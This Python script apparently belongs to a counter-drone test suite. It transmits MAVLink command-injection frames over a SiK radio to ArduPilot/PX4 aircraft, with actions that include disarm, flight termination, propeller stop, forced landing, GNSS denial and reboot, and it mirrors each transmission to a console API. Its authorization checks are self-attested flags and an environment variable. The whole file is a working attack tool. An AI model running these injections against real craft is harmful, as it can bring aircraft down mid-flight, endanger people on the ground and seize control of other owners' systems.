#!/usr/bin/env python3
"""Real MAVLink command injection over a SiK 915MHz telemetry radio.

TRANSMITS over RF via the SiK radio's own modem. This is real command
injection against a paired MAVLink craft (ArduPilot/PX4), not a simulation.

SAFETY GATING — this script refuses to run unless BOTH are true:
  1. env var CEMA_AUTHORIZED_RANGE=1
  2. --i-confirm-authorized-range passed on the command line

Only run this at STEAG under Army Signals spectrum authorization, against
your own paired test craft. It reuses the exact byte-accurate packet
builders from backend/mavlink_codec.py so what you see on the console is
what actually goes out over the radio.
"""
from __future__ import annotations

import argparse
import os
import sys
import time
from pathlib import Path

import requests
import serial  # pyserial

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "backend"))
from mavlink_codec import (  # noqa: E402
    payload_force_land, payload_rth, payload_disarm, payload_flight_termination,
    payload_propeller_stop, payload_reboot, payload_rth_spoof_home, payload_gnss_denial,
    broadcast_takedown, describe_packet, hexdump,
)

ACTIONS = {
    "land": payload_force_land,
    "rth": payload_rth,
    "disarm": payload_disarm,
    "flight_termination": payload_flight_termination,
    "propeller_stop": payload_propeller_stop,
    "reboot": payload_reboot,
    "gnss_denial": payload_gnss_denial,
}


def check_authorized() -> None:
    if os.environ.get("CEMA_AUTHORIZED_RANGE") != "1":
        print("REFUSING: CEMA_AUTHORIZED_RANGE=1 is not set.\n"
              "This script transmits real RF via the SiK radio. Only set this\n"
              "at STEAG under Army Signals spectrum authorization.", file=sys.stderr)
        sys.exit(1)


def login(console_url: str, email: str, password: str) -> str:
    r = requests.post(f"{console_url}/api/auth/login", json={"email": email, "password": password}, timeout=10)
    r.raise_for_status()
    return r.json()["token"]


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", required=True, help="Serial device for the SiK radio, e.g. /dev/ttyUSB0")
    ap.add_argument("--baud", type=int, default=57600)
    ap.add_argument("--action", required=True, choices=list(ACTIONS.keys()))
    ap.add_argument("--target-sys", type=int, default=1)
    ap.add_argument("--target-comp", type=int, default=1)
    ap.add_argument("--console-url", required=True)
    ap.add_argument("--email", required=True)
    ap.add_argument("--password", required=True)
    ap.add_argument("--i-confirm-authorized-range", action="store_true",
                    help="Required. Confirms you are at an authorized, supervised test range.")
    args = ap.parse_args()

    if not args.i_confirm_authorized_range:
        print("REFUSING: pass --i-confirm-authorized-range to acknowledge you are at an "
              "authorized, supervised test range (STEAG).", file=sys.stderr)
        sys.exit(1)
    check_authorized()

    frame = ACTIONS[args.action](args.target_sys, args.target_comp)
    info = describe_packet(frame)
    print(f"Prepared {args.action} packet: {info}")
    for line in hexdump(frame):
        print(line)

    confirm = input(f"\nAbout to TRANSMIT this over {args.port} to system {args.target_sys}. "
                     f"Type 'TRANSMIT' to proceed: ")
    if confirm.strip() != "TRANSMIT":
        print("Aborted — no transmission sent.")
        sys.exit(0)

    with serial.Serial(args.port, args.baud, timeout=2) as radio:
        time.sleep(0.5)  # let the SiK modem settle after opening the port
        radio.write(frame)
        radio.flush()
    print(f"Transmitted {len(frame)} bytes over {args.port}.")

    token = login(args.console_url, args.email, args.password)
    headers = {"Authorization": f"Bearer {token}"}
    body = {
        "message_id": 76,
        "version": "v2",
        "system_id": 255,
        "component_id": 190,
        "target_system": args.target_sys,
        "target_component": args.target_comp,
        "sequence": 0,
        "command": 0,
    }
    try:
        requests.post(f"{args.console_url}/api/mavlink/broadcast", json=body, headers=headers, timeout=5)
        print("Mirrored event to console.")
    except requests.RequestException as e:
        print(f"console mirror failed (transmission already happened): {e}", file=sys.stderr)


if __name__ == "__main__":
    main()
